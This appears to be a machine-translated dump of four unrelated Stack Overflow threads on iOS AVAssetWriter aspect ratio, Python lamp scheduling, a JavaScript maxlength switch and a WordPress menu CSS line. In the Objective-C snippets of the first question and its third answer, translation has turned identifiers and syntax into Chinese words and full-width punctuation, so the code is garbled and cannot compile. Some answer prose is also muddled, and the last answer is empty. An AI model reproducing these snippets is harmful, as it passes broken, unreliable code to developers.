> 时间：2012-12-19T16:57:08.127
> 
> 标签：ios, avfoundation, avassetwriter

我有以下代码，它从相机捕获视频并使用 AVAssetWriter 将其存储为 QuickMovie 文件。它工作正常，但纵横比并不完美，因为宽度和高度在 AVAssetWriterInput 的 outputSettings 中是硬编码的（480 x 320）。

我宁愿找出源视频的纵横比，并指定适当的高度（480 x 纵横比）。有人知道怎么做吗？我应该将 AssetWriterInput 的创建推迟到第一个 sampleBuffer 之前吗？

```
      // 将 sessionPreset 设置为 'medium'
      self.captureSession = [[AVCaptureSession alloc] init];
      self.captureSession.sessionPreset = AVCaptureSessionPresetMedium;
      ...

      // 创建 AVCaptureVideoDataOutput
      self.captureVideo = [[AVCaptureVideoDataOutput alloc] init];
      NSString* formatTypeKey = (NSString*)kCVPixelBufferPixelFormatTypeKey;
      self.captureVideo.videoSettings = @{
        formatTypeKey:[NSNumber numberWithInt:kCVPixelFormatType_32BGRA]
      };
      [self.captureVideo setSampleBufferDelegate:self queue:dispatch_get_main_queue()];

      // 创建一个 AVAssetWriter
      NSError* 错误 = 零；
      self.videoWriter = [[AVAssetWriter alloc] initWithURL:url
                             文件类型：AVFileTypeQuickTimeMovie
                             错误：&错误];
      ...
      // 创建具有指定设置的 AVAssetWriterInput
      NSDictionary* 压缩 = @{
        AVVideoAverageBitRateKey:[NSNumber numberWithInt:960000],
        AVVideoMaxKeyFrameIntervalKey:[NSNumber numberWithInt:1]
      };
      self.videoInput = [AVAssetWriterInputassetWriterInputWithMediaType:AVMediaTypeVideo
            输出设置：@{
              AVVideoCodecKey:AVVideoCodecH264,
              AVVideoCompressionPropertiesKey：压缩，
              AVVideoWidthKey:[NSNumber numberWithInt:480], // 必需
              AVVideoHeightKey:[NSNumber numberWithInt:320] // 必需
            }];

      // 将其添加到 AVAssetWriter
      [self.videoWriter addInput:self.videoInput];

```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2016-02-26T05:52:15.557

这对我来说是这样的；您解决的方法不允许您的应用程序向下扩展。你不妨一开始就学会如何正确地做事——即使付出更多的时间和精力——也比不这样做。

在我的应用程序中，创建资产编写器后...

```
_writer = [[AVAssetWriter alloc] initWithURL:_outURL fileType:AVFileTypeQuickTimeMovie error:outError]; 
```

...我创建了一个视频资产轨道...

```
 NSArray *videoTracks = [_asset tracksWithMediaType:AVMediaTypeVideo];
        if ([videoTracks count] > 0)
            assetVideoTrack = [videoTracks objectAtIndex:0]; 
```

...然后一个资产阅读器跟踪输出对象：

```
_readerVideoOutput = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:assetVideoTrack outputSettings:decompressionVideoSettings];
            [_reader addOutput:_readerVideoOutput]; 
```

然后，我将视频轨道的格式描述属性加载到一个数组中，在访问每个属性时将每个元素转换为 CMFormatDescriptionRef 对象：

```
CMFormatDescriptionRef formatDescription = NULL;
NSArray *formatDescriptions = [assetVideoTrack formatDescriptions];
if ([formatDescriptions count] > 0)
    formatDescription = (__bridge CMFormatDescriptionRef)[formatDescriptions objectAtIndex:0]; 
```

然后，我尝试加载干净光圈设置和像素纵横比设置，最后在它们之间进行选择：

```
if (formatDescription)
            {
                NSDictionary *cleanAperture = nil;
                NSDictionary *pixelAspectRatio = nil;
                CFDictionaryRef cleanApertureFromCMFormatDescription = CMFormatDescriptionGetExtension(formatDescription, kCMFormatDescriptionExtension_CleanAperture);
                if (cleanApertureFromCMFormatDescription)
                {
                    cleanAperture = @{
                                      AVVideoCleanApertureWidthKey            : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureWidth),
                                      AVVideoCleanApertureHeightKey           : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureHeight),
                                      AVVideoCleanApertureHorizontalOffsetKey : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureHorizontalOffset),
                                      AVVideoCleanApertureVerticalOffsetKey   : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureVerticalOffset)
                                      };
                }
                CFDictionaryRef pixelAspectRatioFromCMFormatDescription = CMFormatDescriptionGetExtension(formatDescription, kCMFormatDescriptionExtension_PixelAspectRatio);
                if (pixelAspectRatioFromCMFormatDescription)
                {
                    pixelAspectRatio = @{
                                         AVVideoPixelAspectRatioHorizontalSpacingKey : (id)CFDictionaryGetValue(pixelAspectRatioFromCMFormatDescription, kCMFormatDescriptionKey_PixelAspectRatioHorizontalSpacing),
                                         AVVideoPixelAspectRatioVerticalSpacingKey   : (id)CFDictionaryGetValue(pixelAspectRatioFromCMFormatDescription, kCMFormatDescriptionKey_PixelAspectRatioVerticalSpacing)
                                         };
                }
                // Add whichever settings we could grab from the format description to the compression settings dictionary.
                if (cleanAperture || pixelAspectRatio)
                {
                    NSMutableDictionary *mutableCompressionSettings = [NSMutableDictionary dictionary];
                    if (cleanAperture)
                        [mutableCompressionSettings setObject:cleanAperture forKey:AVVideoCleanApertureKey];
                    if (pixelAspectRatio)
                        [mutableCompressionSettings setObject:pixelAspectRatio forKey:AVVideoPixelAspectRatioKey];
                    compressionSettings = mutableCompressionSettings;
                }
            } 
```

那就是您感到困惑的地方；一些视频轨道有一个，但没有另一个，反之亦然。因此，您尝试同时加载它们，然后选择哪一组属性已满，并丢弃未满的一组。

请记住，实际上只有一种方法可以嵌套读取和写入 iPhone 文件所需的所有方法，即使您确实看到了很多变化。你能做的最合理和最谨慎的事情就是确保你以正确的方式做这件事。

如果你有兴趣看看它的样子，这里是：

```
#import "ExportVideo.h"

@implementation ExportVideo

@synthesize url = _url;
@synthesize renderer = _renderer;

- (id)initWithURL:(NSURL *)url usingRenderer:(GLKitView *)renderer {
    NSLog(@"ExportVideo");
    if (!(self = [super init])) {
        return nil;
    }

    self.url = url;
    self.renderer = renderer;

    NSString *serializationQueueDescription = [NSString stringWithFormat:@"%@ serialization queue", self];
    _mainSerializationQueue = dispatch_queue_create([serializationQueueDescription UTF8String], NULL);

    NSString *rwAudioSerializationQueueDescription = [NSString stringWithFormat:@"%@ rw audio serialization queue", self];
    _rwAudioSerializationQueue = dispatch_queue_create([rwAudioSerializationQueueDescription UTF8String], NULL);

    NSString *rwVideoSerializationQueueDescription = [NSString stringWithFormat:@"%@ rw video serialization queue", self];
    _rwVideoSerializationQueue = dispatch_queue_create([rwVideoSerializationQueueDescription UTF8String], NULL);

    return self;
}

- (void)startProcessing {
    NSDictionary *inputOptions = [NSDictionary dictionaryWithObject:[NSNumber numberWithBool:YES] forKey:AVURLAssetPreferPreciseDurationAndTimingKey];
    _asset = [[AVURLAsset alloc] initWithURL:self.url options:inputOptions];
    NSLog(@"URL: %@", self.url);
    _cancelled = NO;
    [_asset loadValuesAsynchronouslyForKeys:[NSArray arrayWithObject:@"tracks"] completionHandler: ^{
        dispatch_async(_mainSerializationQueue, ^{
            if (_cancelled)
                return;
            BOOL success = YES;
            NSError *localError = nil;
            success = ([_asset statusOfValueForKey:@"tracks" error:&localError] == AVKeyValueStatusLoaded);
            if (success)
            {
                NSFileManager *fm = [NSFileManager defaultManager];
                NSString *localOutputPath = [self.url path];
                if ([fm fileExistsAtPath:localOutputPath])
                    success = [fm removeItemAtPath:localOutputPath error:&localError];
            }
            if (success)
                success = [self setupAssetReaderAndAssetWriter:&localError];
            if (success)
                success = [self startAssetReaderAndWriter:&localError];
            if (!success)
                [self readingAndWritingDidFinishSuccessfully:success withError:localError];
        });
    }];
}

- (BOOL)setupAssetReaderAndAssetWriter:(NSError **)outError
{
    // Create and initialize the asset reader.
    _reader = [[AVAssetReader alloc] initWithAsset:_asset error:outError];
    BOOL success = (_reader != nil);
    if (success)
    {
        // If the asset reader was successfully initialized, do the same for the asset writer.
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        _outputURL = paths[0];
        NSFileManager *manager = [NSFileManager defaultManager];
        [manager createDirectoryAtPath:_outputURL withIntermediateDirectories:YES attributes:nil error:nil];
        _outputURL = [_outputURL stringByAppendingPathComponent:@"output.mov"];
        [manager removeItemAtPath:_outputURL error:nil];
        _outURL = [NSURL fileURLWithPath:_outputURL];
        _writer = [[AVAssetWriter alloc] initWithURL:_outURL fileType:AVFileTypeQuickTimeMovie error:outError];
        success = (_writer != nil);
    }

    if (success)
    {
        // If the reader and writer were successfully initialized, grab the audio and video asset tracks that will be used.
        AVAssetTrack *assetAudioTrack = nil, *assetVideoTrack = nil;
        NSArray *audioTracks = [_asset tracksWithMediaType:AVMediaTypeAudio];
        if ([audioTracks count] > 0)
            assetAudioTrack = [audioTracks objectAtIndex:0];
        NSArray *videoTracks = [_asset tracksWithMediaType:AVMediaTypeVideo];
        if ([videoTracks count] > 0)
            assetVideoTrack = [videoTracks objectAtIndex:0];

        if (assetAudioTrack)
        {
            // If there is an audio track to read, set the decompression settings to Linear PCM and create the asset reader output.
            NSDictionary *decompressionAudioSettings = @{ AVFormatIDKey : [NSNumber numberWithUnsignedInt:kAudioFormatLinearPCM] };
            _readerAudioOutput = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:assetAudioTrack outputSettings:decompressionAudioSettings];
            [_reader addOutput:_readerAudioOutput];
            // Then, set the compression settings to 128kbps AAC and create the asset writer input.
            AudioChannelLayout stereoChannelLayout = {
                .mChannelLayoutTag = kAudioChannelLayoutTag_Stereo,
                .mChannelBitmap = 0,
                .mNumberChannelDescriptions = 0
            };
            NSData *channelLayoutAsData = [NSData dataWithBytes:&stereoChannelLayout length:offsetof(AudioChannelLayout, mChannelDescriptions)];
            NSDictionary *compressionAudioSettings = @{
                                                       AVFormatIDKey         : [NSNumber numberWithUnsignedInt:kAudioFormatMPEG4AAC],
                                                       AVEncoderBitRateKey   : [NSNumber numberWithInteger:128000],
                                                       AVSampleRateKey       : [NSNumber numberWithInteger:44100],
                                                       AVChannelLayoutKey    : channelLayoutAsData,
                                                       AVNumberOfChannelsKey : [NSNumber numberWithUnsignedInteger:2]
                                                       };
            _writerAudioInput = [AVAssetWriterInput assetWriterInputWithMediaType:[assetAudioTrack mediaType] outputSettings:compressionAudioSettings];
            [_writer addInput:_writerAudioInput];
        }

        if (assetVideoTrack)
        {
            // If there is a video track to read, set the decompression settings for YUV and create the asset reader output.
            NSDictionary *decompressionVideoSettings = @{
                                                         (id)kCVPixelBufferPixelFormatTypeKey     : [NSNumber numberWithUnsignedInt:kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange],
                                                         (id)kCVPixelBufferIOSurfacePropertiesKey : [NSDictionary dictionary]
                                                         };
            _readerVideoOutput = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:assetVideoTrack outputSettings:decompressionVideoSettings];
            [_reader addOutput:_readerVideoOutput];
            CMFormatDescriptionRef formatDescription = NULL;
            // Grab the video format descriptions from the video track and grab the first one if it exists.
            NSArray *formatDescriptions = [assetVideoTrack formatDescriptions];
            if ([formatDescriptions count] > 0)
                formatDescription = (__bridge CMFormatDescriptionRef)[formatDescriptions objectAtIndex:0];
            CGSize trackDimensions = {
                .width = 0.0,
                .height = 0.0,
            };
            // If the video track had a format description, grab the track dimensions from there. Otherwise, grab them direcly from the track itself.
            if (formatDescription)
                trackDimensions = CMVideoFormatDescriptionGetPresentationDimensions(formatDescription, false, false);
            else
                trackDimensions = [assetVideoTrack naturalSize];
            NSDictionary *compressionSettings = nil;
            // If the video track had a format description, attempt to grab the clean aperture settings and pixel aspect ratio used by the video.
            if (formatDescription)
            {
                NSDictionary *cleanAperture = nil;
                NSDictionary *pixelAspectRatio = nil;
                CFDictionaryRef cleanApertureFromCMFormatDescription = CMFormatDescriptionGetExtension(formatDescription, kCMFormatDescriptionExtension_CleanAperture);
                if (cleanApertureFromCMFormatDescription)
                {
                    cleanAperture = @{
                                      AVVideoCleanApertureWidthKey            : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureWidth),
                                      AVVideoCleanApertureHeightKey           : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureHeight),
                                      AVVideoCleanApertureHorizontalOffsetKey : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureHorizontalOffset),
                                      AVVideoCleanApertureVerticalOffsetKey   : (id)CFDictionaryGetValue(cleanApertureFromCMFormatDescription, kCMFormatDescriptionKey_CleanApertureVerticalOffset)
                                      };
                }
                CFDictionaryRef pixelAspectRatioFromCMFormatDescription = CMFormatDescriptionGetExtension(formatDescription, kCMFormatDescriptionExtension_PixelAspectRatio);
                if (pixelAspectRatioFromCMFormatDescription)
                {
                    pixelAspectRatio = @{
                                         AVVideoPixelAspectRatioHorizontalSpacingKey : (id)CFDictionaryGetValue(pixelAspectRatioFromCMFormatDescription, kCMFormatDescriptionKey_PixelAspectRatioHorizontalSpacing),
                                         AVVideoPixelAspectRatioVerticalSpacingKey   : (id)CFDictionaryGetValue(pixelAspectRatioFromCMFormatDescription, kCMFormatDescriptionKey_PixelAspectRatioVerticalSpacing)
                                         };
                }
                // Add whichever settings we could grab from the format description to the compression settings dictionary.
                if (cleanAperture || pixelAspectRatio)
                {
                    NSMutableDictionary *mutableCompressionSettings = [NSMutableDictionary dictionary];
                    if (cleanAperture)
                        [mutableCompressionSettings setObject:cleanAperture forKey:AVVideoCleanApertureKey];
                    if (pixelAspectRatio)
                        [mutableCompressionSettings setObject:pixelAspectRatio forKey:AVVideoPixelAspectRatioKey];
                    compressionSettings = mutableCompressionSettings;
                }
            }
            // Create the video settings dictionary for H.264.
            NSMutableDictionary *videoSettings = (NSMutableDictionary *) @{
                                                                           AVVideoCodecKey  : AVVideoCodecH264,
                                                                           AVVideoWidthKey  : [NSNumber numberWithDouble:trackDimensions.width],
                                                                           AVVideoHeightKey : [NSNumber numberWithDouble:trackDimensions.height]
                                                                           };
            // Put the compression settings into the video settings dictionary if we were able to grab them.
            if (compressionSettings)
                [videoSettings setObject:compressionSettings forKey:AVVideoCompressionPropertiesKey];
            // Create the asset writer input and add it to the asset writer.
            _writerVideoInput = [AVAssetWriterInput assetWriterInputWithMediaType:[assetVideoTrack mediaType] outputSettings:videoSettings];
            [_writer addInput:_writerVideoInput];
        }
    }
    return success;
}

- (BOOL)startAssetReaderAndWriter:(NSError **)outError
{
    BOOL success = YES;
    // Attempt to start the asset reader.
    success = [_reader startReading];
    if (!success) {
        *outError = [_reader error];
        NSLog(@"Reader error");
    }
    if (success)
    {
        // If the reader started successfully, attempt to start the asset writer.
        success = [_writer startWriting];
        if (!success) {
            *outError = [_writer error];
            NSLog(@"Writer error");
        }
    }

    if (success)
    {
        // If the asset reader and writer both started successfully, create the dispatch group where the reencoding will take place and start a sample-writing session.
        _dispatchGroup = dispatch_group_create();
        [_writer startSessionAtSourceTime:kCMTimeZero];
        _audioFinished = NO;
        _videoFinished = NO;

        if (_writerAudioInput)
        {
            // If there is audio to reencode, enter the dispatch group before beginning the work.
            dispatch_group_enter(_dispatchGroup);
            // Specify the block to execute when the asset writer is ready for audio media data, and specify the queue to call it on.
            [_writerAudioInput requestMediaDataWhenReadyOnQueue:_rwAudioSerializationQueue usingBlock:^{
                // Because the block is called asynchronously, check to see whether its task is complete.
                if (_audioFinished)
                    return;
                BOOL completedOrFailed = NO;
                // If the task isn't complete yet, make sure that the input is actually ready for more media data.
                while ([_writerAudioInput isReadyForMoreMediaData] && !completedOrFailed)
                {
                    // Get the next audio sample buffer, and append it to the output file.
                    CMSampleBufferRef sampleBuffer = [_readerAudioOutput copyNextSampleBuffer];
                    if (sampleBuffer != NULL)
                    {
                        BOOL success = [_writerAudioInput appendSampleBuffer:sampleBuffer];
                        CFRelease(sampleBuffer);
                        sampleBuffer = NULL;
                        completedOrFailed = !success;
                    }
                    else
                    {
                        completedOrFailed = YES;
                    }
                }
                if (completedOrFailed)
                {
                    // Mark the input as finished, but only if we haven't already done so, and then leave the dispatch group (since the audio work has finished).
                    BOOL oldFinished = _audioFinished;
                    _audioFinished = YES;
                    if (oldFinished == NO)
                    {
                        [_writerAudioInput markAsFinished];
                    }
                    dispatch_group_leave(_dispatchGroup);
                }
            }];
        }

        if (_writerVideoInput)
        {
            // If we had video to reencode, enter the dispatch group before beginning the work.
            dispatch_group_enter(_dispatchGroup);
            // Specify the block to execute when the asset writer is ready for video media data, and specify the queue to call it on.
            [_writerVideoInput requestMediaDataWhenReadyOnQueue:_rwVideoSerializationQueue usingBlock:^{
                // Because the block is called asynchronously, check to see whether its task is complete.
                if (_videoFinished)
                    return;
                BOOL completedOrFailed = NO;
                // If the task isn't complete yet, make sure that the input is actually ready for more media data.
                while ([_writerVideoInput isReadyForMoreMediaData] && !completedOrFailed)
                {
                    // Get the next video sample buffer, and append it to the output file.
                    CMSampleBufferRef sampleBuffer = [_readerVideoOutput copyNextSampleBuffer];

                    /* PROCESS FRAME HERE */
                    //CVImageBufferRef pixelBuffer = CMSampleBufferGetImageBuffer(sampleBuffer);
                    //_currentBuffer = pixelBuffer;
                    //[self performSelectorOnMainThread:@selector(processFrame) withObject:nil waitUntilDone:YES];
                    /* ------------------ */

                    if (sampleBuffer != NULL)
                    {
                        BOOL success = [_writerVideoInput appendSampleBuffer:sampleBuffer];
                        CFRelease(sampleBuffer);
                        sampleBuffer = NULL;
                        completedOrFailed = !success;
                    }
                    else
                    {
                        completedOrFailed = YES;
                    }
                }
                if (completedOrFailed)
                {
                    // Mark the input as finished, but only if we haven't already done so, and then leave the dispatch group (since the video work has finished).
                    BOOL oldFinished = _videoFinished;
                    _videoFinished = YES;
                    if (oldFinished == NO)
                    {
                        [_writerVideoInput markAsFinished];
                    }
                    dispatch_group_leave(_dispatchGroup);
                }
            }];
        }
        // Set up the notification that the dispatch group will send when the audio and video work have both finished.
        dispatch_group_notify(_dispatchGroup, _mainSerializationQueue, ^{
            BOOL finalSuccess = YES;
            NSError *finalError = nil;
            // Check to see if the work has finished due to cancellation.
            if (_cancelled)
            {
                // If so, cancel the reader and writer.
                [_reader cancelReading];
                [_writer cancelWriting];
            }
            else
            {
                // If cancellation didn't occur, first make sure that the asset reader didn't fail.
                if ([_reader status] == AVAssetReaderStatusFailed)
                {
                    finalSuccess = NO;
                    finalError = [_reader error];
                    NSLog(@"_reader finalError: %@", finalError);
                }
                // If the asset reader didn't fail, attempt to stop the asset writer and check for any errors.
                [_writer finishWritingWithCompletionHandler:^{
                    UISaveVideoAtPathToSavedPhotosAlbum(_outputURL, nil, nil, nil);
                    [self readingAndWritingDidFinishSuccessfully:finalSuccess withError:[_writer error]];
                }];
            }
            // Call the method to handle completion, and pass in the appropriate parameters to indicate whether reencoding was successful.

        });
    }
    // Return success here to indicate whether the asset reader and writer were started successfully.
    return success;
}

- (void)readingAndWritingDidFinishSuccessfully:(BOOL)success withError:(NSError *)error
{
    if (!success)
    {
        // If the reencoding process failed, we need to cancel the asset reader and writer.
        [_reader cancelReading];
        [_writer cancelWriting];
        dispatch_async(dispatch_get_main_queue(), ^{
            // Handle any UI tasks here related to failure.
        });
    }
    else
    {
        // Reencoding was successful, reset booleans.
        _cancelled = NO;
        _videoFinished = NO;
        _audioFinished = NO;
        dispatch_async(dispatch_get_main_queue(), ^{
            // Handle any UI tasks here related to success.
        });
    }
    NSLog(@"readingAndWritingDidFinishSuccessfully success = %@ : Error = %@", (success == 0) ? @"NO" : @"YES", error);
}

@end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:01:48.313

One easy solution to this would be to use one of the fixed size AVCaptureSessionPresets, eg `AVCaptureSessionPreset640x480`. It seems like there is no public API to get the AVCaptureSession resolution before capturing begins:

[Knowing resolution of AVCaptureSession's session presets](https://stackoverflow.com/questions/7790402/knowing-resolution-of-avcapturesessions-session-presets)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:49:14.477

谢谢你的快速回答，塔克。根据您的回答，我决定将 AVAssetWriterInput 的创建推迟到第一帧，并且效果很好。这是代码。

```
    CVImageBufferRef imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer);
    CVPixelBufferLockBaseAddress(imageBuffer, 0);
    size_t 宽度 = CVPixelBufferGetWidth(imageBuffer);
    size_t 高度 = CVPixelBufferGetHeight(imageBuffer);
    CVPixelBufferUnlockBaseAddress(imageBuffer,0);
    NSLog(@"NVW 大小=%zd, %zd", 宽度, 高度);

    NSDictionary* 压缩 = @{
        AVVideoAverageBitRateKey:[NSNumber numberWithInt:960000],
        AVVideoMaxKeyFrameIntervalKey:[NSNumber numberWithInt:1]
    };
    self.videoInput = [AVAssetWriterInputassetWriterInputWithMediaType:AVMediaTypeVideo
        输出设置：@{
            AVVideoCodecKey:AVVideoCodecH264,
            AVVideoCompressionPropertiesKey：压缩，
            AVVideoWidthKey:[NSNumber numberWithInt:width],
            AVVideoHeightKey:[NSNumber numberWithInt:height]
        }];
    self.videoInput.expectsMediaDataInRealTime = YES；

```

# python - Python - 使用停止和恢复运行任务功能进行调度

> ID：13957310
> 
> 赞同：0
> 
> 时间：2012-12-19T16:57:25.507
> 
> 标签：python, task, scheduling, resume

我正在开发一个日程安排应用程序，日程表中有很多灯在特定时间打开和关闭，比如说如果我早上开始日程表，所有灯都会打开然后在晚上停止，但是有一些灯需要停止随机时间并再次打开。我尝试了一些 python 包，如 APScheduler，但它没有停止和恢复特定任务（或在这种情况下为灯）的功能。

这个[问题](https://stackoverflow.com/questions/6299349/how-to-stop-and-resume-long-time-running-python-script)使用pickle停止和恢复，但我不知道如何实现它，有什么办法可以解决这个问题？

提前谢谢，对不起我的语法不好。

**- 更新 -**

这是简单的实现，我不确定这段代码是否正确。

```
from datetime import datetime
from time import sleep

class Scheduling:

    def __init__(self):
        self.lamp = {}

    def run(self, lamp_id, start, finish):
        """Called one-time only for each lamp"""

        self.lamp[lamp_id] = (start, finish)

        while True:
            if datetime.now().strftime('%H:%M:%S') == start:
                sleep(1)
                print 'SET LAMP %s ON' % lamp_id
            elif datetime.now().strftime('%H:%M:%S') == finish:
                sleep(1)
                print 'SET LAMP %s OFF' % lamp_id

    def stop(self, lamp_id):
        print 'SET lamp %s OFF' % lamp_id

    def resume(self, lamp_id):
        print 'SET lamp %s ON' % lamp_id 
        finish = self.lamp[lamp_id][1]

        while True:
            if datetime.now().strftime('%H:%M:%S') == finish:
                print 'SET lamp %s OFF' % lamp_id 

if __name__ == '__main__':
    schedule = Scheduling()
    schedule.run(1, '00:00:00', '00:01:00') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:37:23.380

使用 APScheduler 不是一个糟糕的解决方案，也是我在这种情况下会使用的解决方案。我要做的是编写一个客户触发器。

此触发器将使用客户数据库或数据存储，它很容易从默认内存存储或数据库存储扩展。这有一个标志是否跳过或不运行特定的作业。因此，现在发生的情况是当打开/关闭灯的任务出现时，客户触发器将检查数据库以查看任务是否打开/关闭并根据其当前状态执行所需的操作。

这可以通过查看[扩展 APScheduler 文档](http://packages.python.org/APScheduler/extending.html)来完成。

[将扩展以包含您的停止/恢复逻辑的间隔触发器类](https://bitbucket.org/agronholm/apscheduler/src/1bc15ac07360227054c3c07b2143d8cd00e758ec/apscheduler/triggers/interval.py?at=default)

[您需要为客户数据存储实现的接口](https://bitbucket.org/agronholm/apscheduler/src/1bc15ac07360227054c3c07b2143d8cd00e758ec/apscheduler/jobstores/base.py?at=default)

编辑：

您的实现有一个问题，即`while`循环将进入无限循环，中间没有睡眠，因为您不处理内部循环部分的 else 情况并且不睡眠。这会导致单灯的 CPU 使用率很高。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:17:45.623

我想你可能看错了这个问题。将“灯亮”视为要停止和恢复的任务过于复杂。真的，你所拥有的是一系列预定的无状态事件；打开一盏灯，关闭一盏灯（也可能是切换灯，如果关闭则将其打开，如果打开则关闭）。如果您尝试以这种方式对系统进行建模，那么设置调度程序可能会更容易。

# javascript - 根据所选选项更改 maxlength

> ID：13957311
> 
> 赞同：1
> 
> 时间：2012-12-19T16:57:24.457
> 
> 标签：javascript, html, forms

我已经看到发布的类似问题并试图更改它们以满足我的需求，但我对 javascript 的了解还不够。我需要当用户更改下拉选择时，动态更改“标题文本字段”最大长度

a、bc 和 d max maxlength 应为 40，maxlength 应为 2

我的代码在下面，我不知道为什么，但它不能正常工作。当我将选择选项更改为“E”时，滴度输入框的 maxLength 是默认值（40），而不是 2。这就是问题所在。应该是2。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>title page</title>
    <script type="text/javascript">
      function changeValue(dropdown) {
        var option = dropdown.options[dropdown.selectedIndex].value,
            field = document.getElementById('titre');

        if (option == 'a' || option == 'b' || option == 'c' || option == 'd') {
          field.maxLength = 40;
        } else if (option == 'e') {
          field.value = field.value.substr(0, 2); // before reducing the maxlength, make sure it contains at most two characters; you could also reset the value altogether
          field.maxLength = 2;
        }
      }?
    </script>
  </head>
  <body>
    <form action="converter.php" method="post">
      <h2>Feel all field below:</h2>
      <div>
        Title: <input type="texte" name="titre" id="titre" maxLength="40"/>  Format: 
        <select id="format" name="format" onchange="changeValue(this);">
          <option value="a">A</option>
          <option value="b">B</option>
          <option value="c">C</option>
          <option value="d">D</option>
          <option value="e">E</option>
        </select>
      </div>
      <div>
        <textarea name="texte" style="width: 415px; height: 155px;"></textarea>
      </div>
      <div>
        <input type="submit" value="OK" />
      </div>
    </form>
  </body>
</html>
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:13:57.480

您在函数定义的末尾有一个问号。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>title page</title>
        <script type="text/javascript">
            function changeValue(dropdown) {
                var option = dropdown.options[dropdown.selectedIndex].value,
                field = document.getElementById('titre');

                if (option == 'e') {
                    field.value = field.value.substr(0, 2); // before reducing the maxlength, make sure it contains at most two characters; you could also reset the value altogether
                    field.maxLength = 2;
                } else {
                    field.maxLength = 40;
                }
            }
        </script>
    </head>
    <body>
        <form action="converter.php" method="post">
            <h2>Feel all field below:</h2>
            <div>
                Title: <input type="texte" name="titre" id="titre" maxLength="40"/>  Format: 
                <select id="format" name="format" onchange="changeValue(this);">
                    <option value="a">A</option>
                    <option value="b">B</option>
                    <option value="c">C</option>
                    <option value="d">D</option>
                    <option value="e">E</option>
                </select>
                </div>
                <div>
                    <textarea name="texte" style="width: 415px; height: 155px;"></textarea>
                </div>
                <div>
                <input type="submit" value="OK" />
            </div>
        </form>
    </body>
</html> 
```

# html - li 项下没有边框的额外白线

> ID：13957315
> 
> 赞同：0
> 
> 时间：2012-12-19T16:57:46.377
> 
> 标签：html, css, wordpress

我的列表项下出现了额外的白线问题。这不是边框，因为我没有设置任何边框，除了我的帐户下的那个，只是为了表明白线不是边框。它下面的一个是——一个与背景颜色相同的 4px 边框。

这个问题是在我解决了我的 Nivo Slider 和我的 WP 网站上的 Woocommerce 插件之间的冲突之后发生的。我让他们两个一起工作，但随后出现了列表中的另一个问题。关于造成这种情况以及如何解决的任何想法？

![在此处输入图像描述](../Images/1f2259587854277774c420a3e6d6c8c1.png)

如果有帮助，这是我的 CSS：

```
#header #navigation ul.nav > li.current_page_item > a 
{ color: #D4145A;}
#header #navigation ul.nav > li:hover a {
border-width: 0px 0px 4px;
border-style: none none solid;
border-color: -moz-use-text-color -moz-use-text-color rgb(212, 20, 90);
-moz-border-top-colors: none;
-moz-border-right-colors: none;
-moz-border-bottom-colors: none;
-moz-border-left-colors: none;
border-image: none;
background: none repeat scroll 0% 0% rgb(212, 20, 90);} 
```

以及它的HTML：

```
<nav id="navigation" class="col-full parent" role="navigation">
<ul id="main-nav" class="nav fl parent">
<li class="page_item"></li>
<li class="page_item page-item-11"></li>
<li class="page_item page-item-12"></li>
<li class="page_item page-item-13 parent"></li>
<li class="page_item page-item-15 current_page_item parent">
<a href=""></a>
<ul class="children"></ul></li>
</ul>
</nav> 
```

请帮忙！我已经束手无策了！谢谢！

只需添加：

这是我修复 Nivo Slider 和 Woocommerce 插件之间的冲突之前的样子：

[url= [http://postimage.org/image/lx50u5qxx/]](http://postimage.org/image/lx50u5qxx/]) [img] [http://s10.postimage.org/lx50u5qxx/noextraline.jpg[/img][/url]](http://s10.postimage.org/lx50u5qxx/noextraline.jpg[/img][/url])

[http://postimage.org/image/lx50u5qxx/](http://postimage.org/image/lx50u5qxx/)

如果我返回并删除对 Nivo-Woocommerce js 冲突的修复，我的导航会回到上面链接的旧漂亮自我，没有白线。

我对 Nivo-Woocommerce 冲突的修复是我在这里找到的这个：

[jScrollPane 和 NivoSlider WP 插件之间的 jQuery 冲突问题](https://stackoverflow.com/questions/10033167/jquery-conflict-issues-between-jscrollpane-and-nivoslider-wp-plugin)

非常感谢到目前为止的答案。希望那里有人可以帮助我。

添加：

刚刚注意到，在上面的“之前”图像中，向下箭头没有显示，它们应该显示，并且仅在我执行 Nivo“修复”时显示。我想这也与它有关？箭头的css是这样的：

```
#header #navigation ul.nav > li.parent a::after {
font-family: 'WebSymbolsRegular';
display: inline-block;
font-size: .857em;
margin-left: .618em;
content: ";";
color: #dedede;
font-weight: normal;
} 
```

* * *

## 回答 #1

> 赞同：1
